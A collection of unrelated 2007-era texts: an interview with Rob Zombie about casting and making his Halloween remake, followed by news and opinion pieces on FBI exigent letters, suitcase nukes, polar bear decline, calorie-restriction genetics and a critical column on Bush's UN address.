It was great that they had n’t seen it , because I did n’t want them to imitate what had come before them , because well … the people in the original did n’t imitate anything .
That was just their fresh take on what they should do .
If people start imitating , then it would get weird .
You do n’t want to watch someone do a Donald Pleasence imitation or something .
And there ’s no reason that they should , because someone like Malcolm McDowell is a great actor .
I wanted Malcolm McDowell to be Malcolm McDowell , not to be imitating someone else .
For the most part , the cast had either not seen the movie , or had seen it so long ago that their memories of it were so vague .
So , it was never really a factor .
What about for someone like Danielle Harris , who not only had seen ( the original ) but had been in other " HALLOWEEN " sequels ?
Casting Danielle was a different case .
A lot of people had approached me to be in the movie that had been in the other movies .
And I said “ No offense , I think you ’re great and I ’d love to work with you , but I do n’t want you in " HALLOWEEN " ” because if you start seeing people that are in cameos , the movie does not play as a serious movie .
It plays as a joke , and I did n’t want that .
Danielle Harris came in and read , I was n’t there that day , but I really was thinking I was n’t going to cast her because she had been in HALLOWEEN 4 and 5 and I did n’t see that as a plus , I saw that as a minus .
Yeah , the fans would love her , but I did n’t want to devalue this movie by saying “ Hey look .
It ’s a wink - wink nudge - nudge homage to another movie . ”
I did n’t want to play it that way .
It had to live and die as its own movie .
But , you know , to her credit , and this is the greatest compliment I can give is that she was so great that I cast her even though I did n’t want to cast her .
So , she knew that .
I ’ve told her that many times .
From outside looking in , the casting is excellent .
Did you have some of the cast in mind going in ?
Or cast from auditions ?
It was a little of both .
I mean , all the older actors I wanted .
I knew I wanted Tyler ( Mane ) for Michael Myers .
I knew I wanted Malcolm McDowell .
I knew I wanted William Forsythe and Dee Wallace .
Really , the only people that I cast in casting sessions were the 3 girls , Laurie , Annie , Linda and the 3 kids , young Michael Myers , Tommy Doyle and Lindsay Wallace .
Those are the only people that came in and read .
But everybody else , I knew who I wanted but I did n’t have ... a 10 year old in mind .
Young Michael Myers and Laurie Strode , I knew I needed fresh faces that were not identifiable to any other films .
Scout Taylor - Compton ’s performance from what I ’m hearing is supposed to be really , really strong .
It ’s phenomenal .
She ’s amazing .
And that was the greatest thing , because she was the only person that I wanted .
Tons of people came in .
People that were recognizable from other things , people that were n’t , but Scout was always my number one choice .
So , I always fought for her .
I wanted her to be Laurie Strode , I knew that she would be perfect .
Going back to Malcolm McDowell , I was just wondering what he brought to the table considering what a great actor he is ?
Malcolm ’s a strange actor because he always has that vibe to him .
Even when he ’s the good guy , he seems like he ’s the bad guy .
I do n’t know .
He ’s got that innate sinisterness about him .
But in a very likable way .
Like in A CLOCKWORK ORANGE , no matter how bad he is , you think “ I kinda like that guy ! ”
What was great about " HALLOWEEN " is we created more of a character arc where younger Loomis is more idealistic .
He ’s a child psychologist who starts working with this kid .
And I kind of took the approach with it , I tried to pull from real life , Vincent Bugliosi is just a prosecutor , but then he gets the Manson case .
So now he ’s the world ’s most famous prosecutor and that ’s going to change your life .
Now , he ’s forever linked to Charles Manson .
Forever .
And that ’s kind of the way I wanted to take it here .
Doctor Loomis crosses paths with Michael before he ever does anything .
And then he becomes part of Michael ’s life , and they become so intertwined that Malcolm starts one way and ends up another way .
He starts out very idealistic and sort of becomes this cynical guy that knows that everything he did was basically a failure .
It ’s interesting to watch his character evolve .
Donald ( Pleasence ) often said he loved the character of Loomis and would keep playing him .
How ’d Malcolm feel about the character ?
I think Malcolm would do it again .
Probably .
Malcolm seemed to have a blast .
He was enjoying every minute of it .
I loved Malcolm .
That was one of the greatest things about this movie .
I ’ve always loved Malcolm , weather it was CLOCKWORK or IF or O LUCKY MAN or CALIGOLA or TIME AFTER TIME , I was always a big Malcolm fan .
And to get to work with him , and to have him be the coolest fucking guy you ’re ever going to meet was just great .
What more could you ask for ?
Speaking of innately sinister actors , what about Brad Dourif ?
You see him on screen for 5 minutes and he ’s innately sinister .
That ’s the funny thing .
I like casting people like that .
I cast Brad as the Sheriff , he ’s the good guy .
I cast Danny Trejo as kind of like the sympathetic kind of guy , not as a tough guy .
I cast Clint Howard as the serious doctor .
I was trying to cast people opposite what they normally are .
And Brad ’s great , what I love about Brad is he comes across so earnest in his performance .
He really sinks in and he really , really thinks about it .
He does n’t just show up and say his lines , he really thinks about it and you can see it in his eyes .
It ’s something that you may not even notice on set sometimes , and it ’s sorta like that X factor that only certain actors have , but there ’s just a whole other level to the look in their eye and you really buy into it .
That ’s Brad .
Brad ’s really brilliant .
I really enjoyed working with him .
Dee Wallace was another one who was a pleasure to work with .
She ’s a sweetheart , met her a couple of times at the conventions .
I never wanted her to leave !
( Laughs )
Ya know , I just wanted to keep sticking her in scenes because she ’s just so great .
She ’s another one , she ’s made a million movies , but she ’s just incredible .
It ’s just a big love fest going on .
( Laughs )
You ’ve got Sybil Danning in this too !
I met Sybil for GRINDHOUSE .
Because my original plan for the three Nazis was to have Sheri , Sybil and Diane Thorn ( Ilsa ) as the three Nazi women .
But Diane did n’t want to do it , for some reason .
That was kinda a bummer .
Um , but that ’s where I met Cybil .
And I was already in production on " HALLOWEEN " at that time when I stopped to do the WEREWOLF WOMAN thing .
And she said , “ Oh if there ’s anything in " HALLOWEEN " , I ’d love to do it .
Anything .
Anything ! ”
And there really was only one kind of part left , she plays a nurse in the sanitarium .
It ’s one brief scene .
But she came in and rocked it .
( Laughs )
Considering how active you were with your blog on My Space , it seems like we were all getting our news and information from your My Space blog .
Was any of the feedback you were getting on the internet influential while you were making the film ?
It was not influential in any way whatsoever .
It really ca n’t be , because the people that are commenting have no idea what they ’re commenting on .
They ’re commenting on a movie that they have n’t seen , or a movie that is n’t even been made yet !
So , it ’s completely useless information unfortunately .
And um , when I was working on the film , in pre-production on making the film , I did n’t look at anything on line or anywhere , because I did n’t care .
Because you ’re so focused on what you ’re trying to do , that it just does n’t matter .
The only way to make your movie is you have to have a vision for what you want , and you have to be so single - minded that you do n’t give a fucking shit what any one thinks .
It ’s the same thing with casting .
Certain people in the movie , nobody wanted me to cast them , and I had to fight to cast them .
It went on for months sometimes , but I would n’t let go of it .
And now , that it ’s done , it ’s like “ Wow , that person ’s fucking amazing .
Thank God we cast them ! ”
Because that ’s the way it goes .
That ’s the director ’s job , you have to be put on the blinders and get ready to fucking fight the fight .
Expanding upon your My Space blog , there was a lot of concern from fans that telling the backstory might take away from the mystique of Michael Myers .
But as a fan , I always craved for more of that story to be told .
Yeah , and I mean , truthfully all that kind of talk to me is meaningless , because people ’s only frame of reference is that ( original ) movie .
So , that ’s why they think it ’s that way .
Even ( John ) Carpenter put in a few extra scenes in " HALLOWEEN " 2 . Such as him carving “ sister ” in the wall of his room at Smiths Grove …
I think it ’s totally fascinating .
I do n’t think it demystifies the character .
First of all , nobody knows what I did .
( Laughs )
People say I do n’t want all that explained .
Who ever said I was explaining anything ?
The funniest thing about the internet … is one person will say , “ Well I heard this … ” and then that sends 100 other people off on a tangents about why that would be a bad idea .
Well , that ’s not true to begin with , so I do n’t know why they ’re all getting bent out of shape .
I mean , the thing with Michael Myers , I did n’t want to explain anything .
Because that is sort of the great thing about him .
I wanted to get glimpses of his life , but everything that would make him that person is completely unexplainable .
You ca n’t go “ Oh this happened , so he ’s like that . ”
No , the whole point was I wanted to set him in a more lower class situation because it does n’t matter if he grew up in a rich family or a poor family , he ’s still fucking psycho !
The environment does n’t matter .
Friends do n’t matter , because he ’s a fucking psychopath and I just found that interesting .
Good boy from nice house goes bad - it just did n’t interest me to do the same stuff that had been done before .
Anyway , that stuff people have created .
In the first " HALLOWEEN " movie , all we know is that through the POV of a clown mask , a kid goes in and kills his sister .
He walks outside , two people drive up , one guy pulls off the mask and says “ Michael ? ”
That ’s all we know !
Maybe they ’re the next door neighbors ?
Maybe he was beaten by his father ?
We do n’t know anything !
Anything from that movie is pure speculation put on by the fans .
I mean , we do n’t know anything .
It was my job to fill in the blanks as I saw fit .
Retelling the story to satisfy both purists and fans who wanted more , and your own vision .
Yeah , and what I thought was fascinating , or what ’s fascinating to me is we get to see Doctor Loomis in the original after the shit ’s hit the fan .
He ’s worked with this young boy , he ’s failed , and now all he wants to do is keep him locked up .
Well , I thought , how great to see Doctor Loomis while he ’s still optimistic about Michael Myers .
And slowly he realizes this is hopeless .
That ’s what I thought was great .
Donald Pleasence would hint at these things but we never got to see them .
I know , and I always wanted to see that stuff .
A crazy guy in a nightgown jumps out into the rain and drives the car away .
That ’s all we got .
The other thing that drives me crazy , I ’m always comparing and contrasting the films , but I fucking LOVE John Carpenter ’s film .
But the problem is when I compare and contrast , people think I ’m insulting the movie .
No , I ’m not .
I ’m just telling you how mine ’s different .
Has he ( John Carpenter ) seen the final product yet ?
No , as of now no one ’s seen the final product except me .
Well , and the editor .
What was the dialogue like with Carpenter when you started working on " HALLOWEEN " ?
Oh it was pretty simple .
I called him the day before the news was breaking , because I knew the next day it was going to be in Variety or something .
I had known John for about 10 years , so I called him up “ Hey , just wanted to tell you I ’m doing this " HALLOWEEN " remake ” .
And he said , “ Hey , great !
That ’s cool .
Go for it .
Anything else ? ” ( Laughs )
He ’s a mellow dude .
He was just like “ Cool ! ”
The music in " HALLOWEEN " is almost as iconic as Michael Myers himself .
What were you looking for from Tyler Bates ' new score ?
Tyler was in the same boat as me essentially .
Because the music is just as iconic as anything else .
And we were n’t really sure , because as I was shooting , he did n’t really start the music .
He kind of dabbled with it , but he did n’t start until late in the process , because we were n’t even sure if the John Carpenter themes would work .
You know , because they ’re so familiar and they ’re so associated with the movies you ’ve already seen .
I do n’t know .
I thought maybe when you ’re watching this movie , they ’ll seem out of place .
Who knows ?
I mean , we eventually did use all of them .
All the classic stuff .
He went back and rescored them , but played them pretty straight .
We did n’t want to make it big and bombastic and rocking and techno - ey or any horseshit like that .
We did it on purpose so it kind of sounded old .
If anything had a weird synth thing , we ’d use some old junk .
We wanted it to sound authentic .
And when he composed new music , it was the same thing .
We wanted to make it sound like maybe there was a piece of score we never heard from back then .
The score is pretty cool .
How ’d you decide on the songs ?
And how integral to the film are they ?
Well , the songs that I picked that I used , they do n’t play as score .
It ’s not like DEVIL ’S REJECTS where “ Freebird ” plays as a score element .
The songs are all pretty much background things on the radio and things like that .
What I like about putting songs like that in the movie is it just grounds the world in reality .
And also , what was nice is that there ’s almost no sound in Smiths Grove Sanitarium .
It ’s so sterile .
And when Michael gets out the first place he goes to is this huge truck wash where they wash 18 wheelers and that ’s when he has his altercation with Ken Foree ’s character .
The guys are washing the trucks and blasting music .
And it was just like , from the world he had been trapped in to for 15 years , he steps outside and just explodes in this world of sound .
It was just a way to contrast the isolation that he ’d been living in for all those years .
Can you talk a little bit about the recent reshoots ?
Basically that ’s been blown out of proportion .
Basically every movie on the planet Earth has addition shooting .
Sometimes you hear about it , sometimes you go back and shoot for 2 days .
Sometimes people go back and shoot for 8 weeks .
Reshoot half the movie .
We shot for about 6 days .
We were n’t done with the movie .
We had a rough cut and we screened it in New York and it did really well , and Bob Weinstein came up to me after the movie and said “ Rob , the movies scored great .
It did great .
I really believe in this film .
If there ’s any stuff that you felt you did n’t get the first time , or that you feel you want to go back to get to add into the movie , I will give you the money to go back and do that . ”
And that was it .
He never told me what to shoot .
He never even suggested anything .
He just said “ If there ’s anything that you feel you can do to make this movie better , I will support you in that . ”
And truthfully , there were things .
Making a movie is like a crazy jigsaw puzzle .
And it ’s not until it ’s done that you get to see it and say , “ Shit .
I wish I had that piece .
And that piece there . ”
For THE DEVIL ’S REJECTS , I did n’t have that opportunity to go back and do that , but luckily on here , I did , so I took it .
One thing I wanted to do was restructure the time line of the movie .
So I actually went back and reshot some scenes that were played in the daytime , and I reshot them at night time .
Different things that I had to restructure .
There were a couple of new things , certain characters to me felt like they did n’t resolve themselves .
One of them in particular was Danny Trejo ’s character .
And that was it .
How ’s your editing process coming along ?
I know you ’re on a tight schedule to make the August 31st release .
We ’re basically done .
I screened the final print today .
( 8/9/07 ) And um … there ’s one little thing we ’re fixing , but the movie is 100 % finished .
And just sitting in a can waiting to show someone now .
What an amazing thing as a horror fan , as a horror aficionado to take a crack at remaking one of the greatest horror films ever made …
Oh , it ’s totally surreal .
Totally surreal .
I ’ve had a bunch of surreal moments in my life like that .
One of them was about a year ago when I was on stage playing God Of Thunder with Ace Frehley .
I was thinking “ This is so weird !
I was like this goofy kid that worshiped KISS in the 70’s and I ’m on stage doing this song . ”
Ace Frehley ’s on stage with me doing this song , and the other KISS guys are standing off stage and I ’m thinking “ This is fucking weird !
This is like some bizarre dream . ” " HALLOWEEN " was the same thing .
You ’re on set … shooting " HALLOWEEN " .
And I ’m in Pasadena , shooting a lot of it on the same streets that Carpenter shot on .
This seemed like I had a weird " HALLOWEEN " dream .
I never lose that feeling of how insanely cool it is .
People are touchy about " HALLOWEEN " .
But what can you say to sway fans of yours that this is OK .
Because remakes have a long tradition in horror .
You ’re a horror fan , so you know that .
The Universal monster movies were remade by Hammer in the 50’s .
And THE FLY was remade in the 80’s .
There ’s good stuff there …
I think so …
To me , remakes are sort of about passion and intent .
I mean , obviously .
When someone goes “ Who do you like better as Dracula ?
Lugosi or Christopher Lee ? ” I was always like “ Fuck , man .
I love them both .
They ’re both fucking awesome . ”
You know , but you can tell when something is quickly remade for a buck .
This was not that case .
I really believed in this .
And being such a big fan of the original , and like many people , just watching Michael Myers degenerate through 7 sequels until you ’re like “ What ?
That ’s what it ’s come down to ? ” I really wanted to take that character and when he comes on screen have people go , “ Wow .
Michael Myers never looked so fucking bad - ass !
In 30 fucking years . ”
It really mattered to me .
I really wanted it to be great .
I took it totally serious .
People thought I was only doing it for money .
No .
I could ’ve went on tour and made 10 times the money I made making this movie .
It was n’t about money .
It was just about really wanting to do it , and I think that ’s when movie ’s work .
I mean , you can tell !
You can tell .
You love these movies .
I think it ’s the first time in a long time that a remake has been in the hands of someone who loves these movies !
The thing with remakes is , no matter how good the remake is , nothing …
NOTHING can make you love something more then the original because it ’s something special to you .
I mean , same for me .
No matter how great the remake of DAWN OF THE DEAD was , it ’s never going to be as special to me as the experience of seeing the original DAWN OF THE DEAD in a packed theater at Midnight while I was in high school .
That was a mind - blowing experience .
And that ’s no insult to the movie , it ’s just there ’s so much emotional baggage attached to these films for some people .
And I totally get it .
You know , but that does n’t mean that it should n’t be done .
If that was the case , Nosferatu would be our only version of Dracula that we would have seen for the rest of our lives .
There ’s nothing wrong with doing it , you just have to do it with the right intent and not just to make a quick buck .
Which obviously is what goes on a lot .
We do n’t have to bullshit each other .
Even if 100 remakes are bad … you still have to always …
I always liked the guys with the hope …
“ Well , maybe this is the one that fucking everyone ’s happy about . ”
I do n’t care about everyone else ’s movies .
I tried to make this awesome .
A reboot of the series was really the only way to go and to be put in the hands of someone who cares about it like yourself was a great move .
I would never have done a Part 9 .
Part 9 probably would ’ve went direct to video anyway .
What are you going to do ?
I felt like by Part 8 it was Abbott and Costello Meet Frankenstein .
A once great character had become a punch line for someone .
Abbott and Costello make a joke about Frankenstein or Dracula .
That ’s what Michael Myers felt like to me in Part 8 .
Then Hammer does it with Christopher Lee and Peter Cushing and you ’re like “ Fuck yeah , man . ” ( Laughs )
Those are things that made me think this is totally the way to go .
Were you a fan at all of the whole “ Thorn ” story line ?
I could n’t give a shit about that .
No .
They ran out of things to do .
It was almost , well let ’s shoot him into space .
Let ’s have him fight someone else .
( Laughs )
It becomes ridiculous after a while !
It happens with everything .
Ok JAWS .
I love it .
JAWS 2 . I can deal with it .
JAWS 3 . JAWS … 4 ?
What ’s happening here ?
( Laughs )
Have you made your peace with Michael Myers , or would you take it further when this movie does well ?
Or would you leave it the way Carpenter did ?
I ’m done with it .
No matter what this movie does .
If this movie was the biggest movie of all time , I still would n’t come back .
Because I wanted to make a single great film and that ’s all I was concerned with .
And the way the horror genre works , it does n’t matter what I did , they would find a way to make Part 2 .
Ya know ?
If we exploded Michael Myers into a millions pieces , for Part 2 he would regenerate himself maybe .
He ’d be living in an underground laboratory as a secret government project and they would reassemble him !
( Laughs )
The thing I did n’t want to do – I did n’t care about restarting a franchise , because that ’s how you get into trouble .
That ’s how you make crap .
You just really have to be concerned with making a great film for everybody , because really that ’s all anyone really cares about .
You do n’t want it to end and set it up for Part 2 .
That ’s a cheat .
Well , let ’s hope there ’s not too many sequels and that this can stand on its own .
They ’re not even talking about it .
That ’s what I really liked about Bob Weinstein .
He wanted to reinvent it and do something different and was n’t ever talking about firing up a franchise .
He was always focused on making one solid movie .
Because already by now , they ’d be planning Part 2 , if they were thinking that .
And they ’re not .
That ’s what I like about this .
The intentions all around were really in the right place .
Is this theatrical version going to be your final version ?
Will there be a double disc DVD with an alternate version ?
Director ’s cut or something ?
You know , what was really funny about this movie is that we did not get into any trouble with the MPAA .
We got an R rating super easy .
And I was totally baffled by it .
And I do n’t know if it ’s because there ’s been such an onslaught of harsh films , that this did n’t seem so harsh .
I have a feeling it ’s because , I actually think we got away with more because it was Michael Myers , and it was like … a monster .
As opposed to a human hurting another human .
You can blow a zombie ’s head off , but if you blow off a normal guys head off it ’s a problem .
They make these weird rules .
So , I think we got away with a lot because they thought of Michael Myers as “ Oh , well he ’s like a monster ” .
You know ?
What are your thoughts on these recent “ harsh ” movies , like SAW , HOSTEL ?
I have n’t seen a lot of them , so I do n’t really have much thoughts on them .
I do n’t get to the movies enough .
( Laughs ) I ’ll see everything on DVD eventually and then I ’ll tell ya .
Are you taking time off after this ?
I ’m going to take a little bit of time off and then go back on tour in October .
And then once the tours done , start another movie .
Right now I ’m just trying to figure out what that exactly will be .
You have a live record and box set coming out …
The live record comes out in September , the box set is …God knows when , by the time I get it done they wo n’t even make box - sets anymore .
( Laughs )
People will be like “ What ’s this I got for Christmas ?!
This strange box with these discs in it . ” ( Laughs )
How many DVD ’s do you have now ?
Oh I do n’t know .
I must have over 10,000 at this point .
I just finally saw HOT FUZZ .
Finally just saw PAN ’S LABYRINTH .
When I was working on " HALLOWEEN " , I did n’t see anything .
Do you not want to see other movies while you ’re making a movie ?
Sometimes you might do it … usually you ’re watching something because you ’re trying to express an idea to someone else .
Like going “ You see this scene in this movie ?
That ’s the kind of lighting I ’m talking about . ”
Usually you ’re just using it as a tool to express an idea to someone else .
But after working 8 hours all day , or 12 or 14 or 16 hours all day , you certainly do n’t come home and watch movies .
You ’re just too burnt out .
If I should be watching anything , I should be watching The Dailies .
Thanks Rob for your time !

In March , the Justice Department 's Inspector General revealed that FBI agents had sent a flurry of fake emergency letters to phone companies , asking them to turn over phone records immediately by promising that the proper papers had been filed with U.S. attorneys , though in many cases this was a complete lie .
More than 60 of these letters were made public today as part of a FBI document dump in response to a government sunshine lawsuit centered on the FBI 's abuse of a key Patriot Act power .
The most striking thing about these exigent letters ( .pdf ) ( made public via the Electronic Frontier Foundation ) is that they all use the same pathetic , passive bureaucratese : " Due to exigent circumstances , it is requested that records for the attached list of telephone numbers be provided . "
So far they seem to all be coming from the same office : the Communications Analysis Unit which looks to be located in Room 4944 in FBI Headquarters .
The " exigent letters " also refer almost exclusively to a " Special Project " and the only name on any of the letters is Larry Mefford .
Mefford was no rookie FBI agent .
Mefford was the Executive Assistant Director , in charge of the Counterterrorism / Counterintelligence Division .
In English , that means he was in charge of preventing another terrorist attack domestically .
What does that mean ?
Well , Mefford 's name is on documents that requested personal information on Americans .
Some of those requests included information known to be false to the agents signing them .
That 's a federal crime , according to one former FBI agent .
What was this " Special Project " in the Communications Analysis Group ?
What exactly were they doing that would require " expedited " letters that sometimes requested more than 2 pages of phone numbers from phone companies ?
In the immortal words of the Butch Cassidy , who are those guys ?
The documents also show that these " exigent letters " – essentially end runs around the rules set up to keep the FBI from trampling on citizens rights – were n't devised by some rogue Jack Bauer - style agent .
The form letters originated from inside FBI Headquarters and in some cases , bear the name of a senior level FBI offiicial who should have been aware of the letters ' legal grey status and possibility for abuse .
The FBI is fully aware of the power handed to it by Congress 's passage of the Patriot Act.
Indeed , as early as November 28 , 2001 , every field office was warned by the Office of the General Counsel that :
NSLs are powerful investigative tools in that they can compel the production of substantial amounts of relevant information .
However , they must be used judiciously . [...]
In deciding whether or not to re-authorize the broadened authority , Congress certainly will examine the manner in which the FBI exercised it .
Executive Order 12333 and the FCIG require that the FBU accomplish its investigations through the " least intrusive " means .
Supervisors should keep this in mind when deciding whether or not a particular use of NSL authority is appropriate .
The greater availability of NSLs does not mean that they should be used in every case .
From the looks of the audits coming out , that seems to be one memo FBI agents dutifully ignored .
And perhaps rightfully so , since Congress did n't bother to challenge Alberto Gonzales 's knowingly false statements to Congress about the FBI 's use of these powers before they made them permanent .
Fox host ' let down ' by implausibility of suitcase nukes David Edwards and Greg Wasserstrom
Published : Sunday November 11 , 2007
del.icio.us
Print This Email This After appearing in numerous film and TV programs and even creeping its way into American political discourse , the suitcase nuke , a nuclear bomb small enough to be easily hidden , is unlikely to exist , according to experts .
The revelation left the anchors of the Fox News program Fox & Friends more than a little disappointed .
" You mean ' 24 ' is n't true , " Co-host Page Kelly inquired , referring to Fox 's national security - themed prime time hit , starring Kiefer Sutherland as CIA agent Jack Bauer .
" ' 24 's my favorite show . "
" It is a little bit of a let down , " agreed Greg Kelly .
Others likely to be let down by this most - recent reality check on perceived threats to the United States are politicians and political candidates eager to use force on nations they believe would supply such a device to terrorists .
" We do n't want the smoking gun to be a mushroom cloud , " then - National Security Adviser Condoleezza Rice famously said of Iraq 's alleged nuclear program in 2003 , also proven not to exist .
Though she was not making reference to a specific nuclear device , the suitcase bomb , ever - present in the public mind since 9/11 , may have made the idea seem plausible to so many .
The conversation on Fox & Friends then turned to other disappointments , this time at the box office .
The group discussed the lackluster ticket sales of Robert Redford 's new political thriller , Lions for Lambs , explaining that people " are seeing these kind of [ political ] talking points from ' Lions for Lambs ' done better with Bill O'Reilly and John Gibson and here on this program . "

Washington ( ToGW ) - Two - thirds of the world 's current polar bear population could be gone by 2050 if predictions of melting sea ice hold true , the U.S. Geological Survey said on Friday .
Polar bears could become extinct even sooner than predicted because sea ice has been melting faster than expected , the USGS said in a report aimed at determining whether the arctic bear should be classified as a threatened species .
" Projected changes in future sea ice conditions , if realized , will result in loss of approximately two - thirds of the world 's current polar bear population by the mid 21st century , " the report 's executive summary said .
" Because the observed trajectory of Arctic sea ice decline appears to be underestimated by currently available models , this assessment of future polar bear status may be conservative . "
The U.S. Fish and Wildlife Service is considering putting polar bears under the protection of the Endangered Species Act .

In studies going back to the 1930's , mice and many other species subsisting on a severely calorie - restricted diet have consistently outlived their well - fed peers by as much as 40 percent .
But just how a diet verging on the brink of starvation extends lifespan has remained elusive .
Now , researchers at the Salk Institute for Biological Studies have cracked open the black box of how persistent hunger promotes long life and identified a critical gene that specifically links calorie restriction ( CR ) to longevity .
" After 72 years of not knowing how calorie restriction works , we finally have genetic evidence to unravel the underlying molecular program required for increased longevity in response to calorie restriction , " says Andrew Dillin , Ph.D. , an associate professor in the Molecular and Cell Biology Laboratory , who led the study published online in the May 2 issue of Nature .
Having identified a key link between calorie restriction and aging also opens the door to development of drugs that mimic the effects of calorie restriction and might allow people to reap health benefits without adhering to an austere regimen that only ascetics can endure .
Initially , researchers thought that the effect of calorie restriction on aging was mediated through insulin - like signaling pathways in the roundworm Caenorhabditis elegans ( C. elegans ) , but experiments by graduate student Siler Panowski in Dillin 's lab suggested otherwise .
In the worm , signals passed down the insulin / IGF - 1 pathway regulate a DNA - binding protein called DAF - 16 that belongs to what is called the forkhead family .
It was believed that DAF - 16 then regulated expression of genes associated with longevity .
Dillin had also identified a co-regulator in the pathway called SMK - 1 that apparently worked with DAF - 16 to regulate longevity .

" When we asked whether DAF - 16 and SMK - 1 proteins were both necessary for CR - mediated longevity , DAF - 16 turned out to be unnecessary but , somewhat surprisingly , SMK - 1 was , " says first author Panowski .
Since 15 other forkhead - like factors are expressed in C. elegans , graduate student Suzanne Wolff and former post - doctoral fellow Hugo Aguilaniu , Ph.D. , now an assistant professor at the École Normale Supérieure de Lyon , France , set out to determine if any of them teamed up with SMK - 1 to delay aging in the CR - response .
They did this by knocking out each gene separately and observing whether the genetically altered worms still showed enhanced longevity when calorie - restricted .
Loss of only one of the genes , a gene encoding the protein PHA - 4 , negated the lifespan - enhancing effect of calorie - restriction in worms .
And , when researchers undertook the opposite experiment -- by overexpressing pha - 4 in worms -- the longevity effect was enhanced .
" PHA - 4 acts completely independent of insulin / IGF - 1 signaling and turns out to be essential for CR - mediated longevity , " says Panowski .
So far , only one other gene , called sir - 2 , has been implicated in the life - and health - prolonging response to calorie restriction .
Increased amounts of SIR - 2 protein extend longevity of yeast , worms , and flies , but while loss of sir - 2 disrupts the calorie restriction response only in yeast , it has no effect on other organisms , such as worms .
" We know three distinct pathways that affect longevity : insulin / IGF signaling , calorie restriction , and the mitochondrial electron transport chain pathway , yet it is still not clear where sir - 2 fits in .
It seems to meddle with more than one pathway , " says Dillin and adds that " PHA - 4 is specific for calorie restriction as it does not affect the other pathways . "
Humans possess three genes highly similar to worm pha -4 , all belonging to what is called the Foxa family .
All three play an important role in development and then later on in the regulation of glucagon , a pancreatic hormone that unlike insulin increases the concentration of blood sugar and maintains the body 's energy balance , especially during fasting .
The potential payoff for cutting to 60 percent of normal while maintaining a healthy diet rich in vitamins , minerals , and other nutrients , is huge .
Currently it is the only strategy apart from direct genetic manipulation that consistently prolongs life and reduces the risk of cancer , diabetes , and cardiovascular disease , while staving off age - related neurodegeneration in laboratory animals from mice to monkeys .
Although some people are already imposing this strict regimen upon themselves , it is too early tell whether calorie restriction will have the same effect in humans .
Graduate student Jenni Durieux also contributed to the study .
The work was funded by grants from the NIH , American Diabetes Association and the Ellison Medical Research Foundation .
Bush at the UN : a war criminal lectures the world on “ human rights ”
By Bill Van Auken
26 September 2007
George W. Bush delivered his next to the last annual address to the United Nations General Assembly Tuesday .
Taking the same podium that he used five years ago to condemn the world body to “ irrelevance ” if it failed to rubber stamp his plans for a war of aggression against Iraq , Bush cast his regime in Washington as the world ’s greatest champion of human rights and its most generous and selfless benefactor .
That the assembled UN delegates could sit through and then politely applaud such a hypocritical harangue from a man who is without rival as the world ’s greatest war criminal is testimony to the spinelessness and complicity of both the world ’s governments and the United Nations itself .
While Bush made only the barest mention of either Iran or Iraq in his address , everyone in the hall was well aware that he is attempting once again to utilize the world body — much as his administration did five years ago in relation to purported Iraqi “ weapons of mass destruction ” — to secure a phony pretext for another war of aggression , this time against Iran .
No doubt Bush ’s handlers in Washington recognized that to deliver a belligerent speech demanding action by the UN against Iran would only recall the lies and intimidation used by the US administration in 2002 - 2003 to prepare its war against Iraq .
Since then , an estimated 1 million Iraqis have been killed and nearly 4 million more turned into refugees as a result of the unprovoked US invasion with its “ shock and awe ” bombardments and the subsequent occupation that has destroyed every aspect of Iraqi society .
So instead , Bush came before the assembled delegates in the most improbable guise , as the apostle of liberty , equality and the rights of man .
He began his speech by hailing the founding document of the UN drafted more than six decades ago , the Universal Declaration of Human Rights , asserting that this formal declaration in support of freedom , justice and peace “ must guide our work in this world . ”
“ When innocent people are trapped in a life of murder and fear , the Declaration is not being upheld , ” he declared .
Who does the American president think he is kidding ?
Where on the face of the planet are more men , women and children “ trapped in a life of murder and fear ” than in US - occupied Iraq ?
The death toll for Iraqis has been estimated as high as 1,000 a week due to US military operations , the murderous rampage of mercenaries who kill with impunity and the sectarian violence unleashed by the country ’s devastation at the hands of Washington .
Bush declared that the UN must work “ to free people from tyranny and violence , hunger and disease , illiteracy and ignorance , and poverty and despair , ” adding that “ every member of the United Nations must join in this mission of liberation . ”
In the Orwellian language favored by the right - wing ideologues in the Bush administration , “ liberation ” is continuously invoked as the description for the war to impose semi-colonial domination by the US over Iraq and its oil wealth .
And it is this “ mission ” undertaken by means of an eruption of American militarism that Bush demands the world body sanction and support .
Bush continued by invoking the first article of the Universal Declaration , which affirms that “ all human beings are born free and equal in dignity and rights . ”
The greatest threat to this principle , he claimed , comes from “ terrorists and extremists . ”
Therefore , he argued , “ all civilized nations ” must join the US in its global war on terrorism .
Bush then moved on to other subjects , a wise move , given that a more detailed citation of the Universal Declaration would have sounded like a war crimes indictment against his own administration .
It includes , for example , the injunction that “ No one shall be subjected to torture or to cruel , inhuman or degrading treatment or punishment , ” a principle that the Bush White House has explicitly repudiated , both by renouncing the Geneva Conventions and subjecting those detained in the US “ war on terror ” to waterboarding , beatings , sensory deprivation , sexual humiliation and other forms of torture and degrading treatment .
The declaration affirms that “ No one shall be subjected to arbitrary arrest , detention or exile , ” practices that the Bush administration has carried out with impunity , through the holding of detainees without charges , not only at the infamous detention facilities in Guantánamo and Abu Ghraib , but also at secret CIA prisons around the world .
It has introduced “ extraordinary rendition ” into the lexicon of foreign policy , a discreet term for kidnapping people , drugging them and then sending them in hoods and chains to other countries so that they can be tortured .
And there is also the clause of the declaration asserting that “ No one shall be subjected to arbitrary interference with his privacy , family , home or correspondence . ”
This is a principle that the administration has explicitly violated in relation to the American people , not to mention the rest of the world , through the massive illegal domestic spying operation organized through the National Security Agency .
Given his administration ’s infamous reputation , the world ’s horror over the unfolding debacle in Iraq and the mounting fears that an even worse catastrophe is about to be unleashed in Iran , it appeared that those who drafted Bush ’s speech thought it was a good time to change the subject .
Thus , a major thrust of his remarks — and the issue that garnered by far the greatest press coverage — was the American president ’s announcement that he is ordering a tightening of economic sanctions against Myanmar ( Burma ) .
He declared : “ Americans are outraged by the situation in Burma , where a military junta has imposed a 19 - year reign of fear . ”
While no doubt the corrupt military regime that rules the country has carried out brutal repression against its people , the claim that “ Americans are outraged ” by these practices is belied by the fact that given the virtual failure of either the administration or the mass media to pay any attention to the developments there , most Americans know nothing about them .
Bush ’s new measures were hardly sweeping , amounting to further restrictions on visas for Myanmar officials and their families and financial sanctions against the ruling junta and its backers .
The pretense that the Bush administration ’s concerns lie with the aspirations of the people of Myanmar , who have taken to the streets in recent days in mass demonstrations , is farcical .
The US government has supported and directly installed countless military dictatorships from Indonesia to Chile , helping them to carry out far worse atrocities than the Burmese junta in suppressing their own people .
